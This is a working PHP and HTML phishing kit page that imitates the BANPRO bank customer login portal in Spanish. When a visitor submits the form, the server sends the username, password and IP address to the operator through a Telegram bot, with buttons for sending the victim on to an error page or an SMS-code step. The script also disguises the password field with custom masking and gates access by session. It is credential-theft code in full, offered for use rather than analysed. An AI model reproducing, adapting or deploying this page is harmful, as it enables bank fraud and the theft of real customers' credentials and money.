<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['gate_pass'])) {
    header('Location: /', true, 302);
    exit;
}
include("settings.php");

$show_error = isset($_GET['error']);
$session_token = bin2hex(random_bytes(8));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = str_replace(' ', '', $_POST['udata'] ?? '');
    $clave = $_POST['pdata'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $_SESSION['usuario'] = $usuario;
    $_SESSION['security_token'] = $session_token;

    $msg = "🔐 NUEVO INGRESO BANPRO\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"],
                    ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: procesando.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Portal Cliente</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<style>
    * { margin: 0; padding: 0; }
    @font-face {
        font-family: dinReg;
        src: url(din-regular.ttf);
    }

    :root {
        --primary-color: rgb(0, 105, 60);
        --error-color: #ff4444;
        --border-radius: 8px;
    }

    #error-message {
        color: var(--error-color);
        font-size: 14px;
        display: none;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .form-input:focus {
        outline: 2px solid var(--primary-color);
        outline-offset: 1px;
    }
</style>

<div id="main-container" style="overflow: hidden; min-height:100vh; position: relative;">
    <div id="content-wrapper" style="display: inline-block; vertical-align: top; background-color: #fff;">
        <div id="form-container" style="display:inline-block; text-align: center; border-radius: var(--border-radius); vertical-align: top; width: 500px;">
            <form method="post" action="" id="loginForm" style="display: inline-block; width: 420px; height: 660px; border-radius:10px; background-image: url(1.svg); position: relative;">
                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;" alt="">
                <input id="usernameField" name="udata" placeholder="Usuario" type="text" required
                       class="form-input"
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, ''); validarUsuario(this)">

                <input id="passwordField" name="pdata_display" placeholder="Contraseña" type="text" required
                       class="form-input"
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="handlePasswordInput(this)">

                <p id="error-display" style="font-family: sans-serif; position: absolute; top: 417px; left: -47px; width: 357px; color: red; font-size: 14px; display: <?php echo $show_error ? 'block' : 'none'; ?>; z-index: 10;">Usuario o contraseña incorrecta</p>

                <input type="submit" value="Inicie Sesión"
                       class="login-button"
                       style="font-size: 16px; display: block; position: relative; color: #fff; background: var(--primary-color); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: var(--border-radius); cursor: pointer; transition: background-color 0.3s ease;">
            </form>
        </div>
        <div id="banner-container" style="text-align: right; display: inline-block;">
            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                <div id="banner" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;" alt="">
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    @media screen and (max-width:1024px) {
        body {
            width: 100% !important;
            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
            background-repeat: no-repeat !important;
            min-width: auto !important;
            zoom: 90% !important;
        }
        #content-wrapper {
            border-radius: 6px !important;
        }
        #main-container {
            text-align: center !important;
            padding-top: 30px;
        }
        #form-container {
            width: 100% !important;
        }
        #banner-container {
            display: none !important;
        }
    }
</style>
    <script>
        function noEspacios(event) {
            return event.key !== " ";
        }

        function esCorreoElectronico(texto) {
            const textoLimpio = texto.toLowerCase().replace(/\s/g, '');
            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            if (emailPattern.test(textoLimpio)) return true;
            const atIndex = textoLimpio.indexOf('@');
            if (atIndex > 0 && atIndex < textoLimpio.length - 1) {
                const dominio = textoLimpio.substring(atIndex + 1);
                if (dominio.includes('.') && dominio.length > 3) {
                    const partes = dominio.split('.');
                    if (partes.length >= 2 && partes.every(parte => parte.length > 0)) return true;
                }
            }
            return false;
        }

        function validarUsuario(input) {
            const valor = input.value;
            if (esCorreoElectronico(valor)) {
                input.value = '';
                const errorMsg = document.getElementById('error-display');
                errorMsg.textContent = 'No se permiten correos electrónicos en el campo de usuario';
                errorMsg.style.display = 'block';
                setTimeout(() => {
                    errorMsg.textContent = 'Usuario o contraseña incorrecta';
                    errorMsg.style.display = 'none';
                }, 3000);
                return false;
            }
            return true;
        }

        function handlePasswordInput(input) {
            if (!input.dataset.realValue) {
                input.dataset.realValue = '';
            }
            const realValue = input.dataset.realValue;
            const displayedValue = input.value;
            if (displayedValue.length < realValue.length) {
                input.dataset.realValue = realValue.substring(0, displayedValue.length);
            } else if (displayedValue.length > realValue.length) {
                const newChars = displayedValue.substring(realValue.length).replace(/\s/g, '');
                input.dataset.realValue += newChars;
            }
            input.value = '●'.repeat(input.dataset.realValue.length);
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const passwordInput = document.getElementById('passwordField');
            if (passwordInput.dataset.realValue) {
                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = 'pdata';
                hiddenInput.value = passwordInput.dataset.realValue;
                this.appendChild(hiddenInput);
            }
        });

        function validarContrasena(contrasena) {
            const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]).{8,32}$/;
            return regex.test(contrasena);
        }

        document.addEventListener("DOMContentLoaded", function () {
            const form = document.getElementById("loginForm");
            const errorMessage = document.getElementById("error-display");

            form.addEventListener("submit", function (event) {
                const passwordInput = document.getElementById("passwordField");
                const contrasena = passwordInput.dataset.realValue || passwordInput.value;
                if (!validarContrasena(contrasena)) {
                    event.preventDefault();
                    errorMessage.style.display = "block";
                    setTimeout(() => {
                        errorMessage.style.display = "none";
                    }, 10000);
                }
            });
        });
    </script>

<?php if (!$show_error): ?>
<div id="id-popup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.35); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; transition: opacity 0.4s ease;">
    <div style="background: #fff; border-radius: 10px; padding: 28px 24px; max-width: 300px; width: 88%; text-align: center; box-shadow: 0 6px 28px rgba(0,0,0,0.2);">
        <p style="font-family: 'Segoe UI', sans-serif; font-size: 13px; color: #444; line-height: 1.6; font-weight: 700;">Identifícate para continuar</p>
    </div>
</div>
<script>
    (function () {
        var p = document.getElementById('id-popup');
        setTimeout(function () {
            p.style.opacity = '0';
            setTimeout(function () { p.style.display = 'none'; }, 400);
        }, 3000);
    })();
</script>
<?php endif; ?>
</body>
</html>
